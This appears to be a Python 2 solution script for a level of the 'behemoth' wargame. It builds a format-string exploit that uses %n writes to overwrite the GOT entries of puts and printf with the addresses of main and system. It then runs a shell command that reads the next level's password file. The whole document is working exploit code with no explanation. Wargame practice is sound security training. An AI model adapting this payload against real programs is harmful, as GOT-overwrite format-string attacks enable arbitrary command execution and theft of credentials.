import struct
printf = 0x80497a4
system = [(0xc850 - 0x0804) & 0xffff, (0xf7e4 - 0xc850) & 0xffff]
puts = 0x80497ac
main = [(0x0804 - 0x84b8) & 0xffff, 0x84b8 - 0x40]
firstPos = 13
print "/bin/sh -c \"cat /etc/behemoth_pass/behemoth4\" AA" + struct.pack("I", puts) + struct.pack("I", puts + 2) + struct.pack("I", printf) + struct.pack("I", printf + 2) + "%"+str(main[1])+"x"+ "%" + str(firstPos) + "$n" + "%" + str(main[0])+"x" + "%" + str(firstPos + 1) + "$n" + "%"+str(system[0])+"x"+ "%" + str(firstPos + 2) + "$n" + "%" + str(system[1])+"x" + "%" + str(firstPos + 3) + "$n" + "\n"